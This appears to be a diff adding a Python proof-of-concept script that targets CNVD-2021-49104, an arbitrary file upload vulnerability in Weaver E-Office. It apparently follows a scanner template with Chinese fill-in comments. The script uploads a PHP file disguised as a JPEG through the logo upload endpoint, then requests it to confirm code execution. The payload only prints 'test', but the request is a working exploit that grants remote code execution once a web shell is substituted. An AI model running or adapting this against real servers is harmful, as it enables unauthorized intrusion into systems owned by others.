@@ -1,0 +1,36 @@
+#encoding:utf-8
+try:
+    import requests,os,sys,logging
+    logging.basicConfig(level=logging.INFO,format="%(message)s")
+except Exception as e:
+    logging.info("[*] {}".format(e))
+    os._exit(6)
+
+def check(ip,port):
+    target = "http://" + ip + ":" + port
+    payload = "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="                                   #填写payload
+    payload1 = "/images/logo/logo-eoffice.php"
+    header = {
+        "Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"
+    }                                                               #填写header头
+    data = "--e64bdf16c554bbc109cecef6451c26a4\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\nContent-Type: image/jpeg\n\n<?php\nprint \"test\";\n?>\n\n--e64bdf16c554bbc109cecef6451c26a4--"                                               #填写data数据
+    try:
+        req = requests.post(url=target+payload,headers=header,data=data,timeout=3)
+
+        if req.status_code == 200:
+            if (b'logo-eoffice.php' in req.text) :              #填写判断条件
+                req1 = requests.get(target+payload1,timeout= 3)
+                if b"test" in req1.text:
+                    logging.info("[+] {} find Weaver_EOffice_Arbitrary_File_Upload_CNVD_2021_49104".format(ip))                          #填写漏洞名
+                    os._exit(1)
+
+        logging.info("[-] {} do not found Weaver_EOffice_Arbitrary_File_Upload_CNVD_2021_49104".format(ip))                          #填写漏洞名
+        os._exit(2)
+    except Exception as e:
+        logging.info("[*] {}".format(e))
+        os._exit(4)
+
+if __name__== "__main__":
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    check(ip,port)
